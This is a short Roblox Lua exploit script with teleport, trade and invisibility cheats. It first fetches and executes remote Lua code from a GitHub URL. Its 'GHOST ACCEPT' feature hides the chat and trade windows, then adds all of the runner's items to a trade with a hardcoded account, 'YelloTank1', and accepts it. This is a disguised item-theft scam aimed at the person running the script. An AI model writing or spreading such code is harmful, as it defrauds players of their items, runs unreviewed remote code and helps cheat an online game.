local L = loadstring(game:HttpGet("https://raw.githubusercontent.com/7Lib/Example/main/Ui.lua"))()
local W = L:CreateWindow("", "", 10044538039)
W.BackgroundColor3, W.AccentColor = Color3.fromRGB(15,15,15), Color3.fromRGB(200,0,0)

local P, T, RS = game.Players.LocalPlayer, "YelloTank1", game:GetService("ReplicatedStorage")
local SavedPos = nil

local T1 = W:CreateTab("TP")
T1:CreateButton("SAVE POS", function() SavedPos = P.Character.HumanoidRootPart.CFrame end)
T1:CreateToggle("AUTO TP", function(s) _G.ATP = s task.spawn(function() while _G.ATP do if SavedPos then P.Character.HumanoidRootPart.CFrame = SavedPos end task.wait(0.1) end end) end)

local T2 = W:CreateTab("TRADE")
T2:CreateButton("FORCE YELLO", function() local tp = game.Players:FindFirstChild(T) if tp then RS.TradeEvents.SendTradeRequest:FireServer(tp) end end)
T2:CreateToggle("GHOST ACCEPT", function(s) _G.GA = s 
    RS.TradeEvents.TradeStarted.OnClientEvent:Connect(function()
        if _G.GA then
            P.PlayerGui.Chat.Enabled = false
            for _, v in pairs(P.PlayerGui:GetChildren()) do if v.Name:find("Trade") then v.Enabled = false end end
            task.wait(1.5) RS.TradeEvents.AddAllItems:FireServer()
            task.wait(1.5) RS.TradeEvents.AcceptTrade:FireServer()
            task.wait(1) P.PlayerGui.Chat.Enabled = true
        end
    end)
end)

local T3 = W:CreateTab("SAFE")
T3:CreateButton("GHOST MODE", function() for _, v in pairs(P.Character:GetDescendants()) do if v:IsA("BasePart") or v:IsA("Decal") then v.Transparency = 1 end end end)
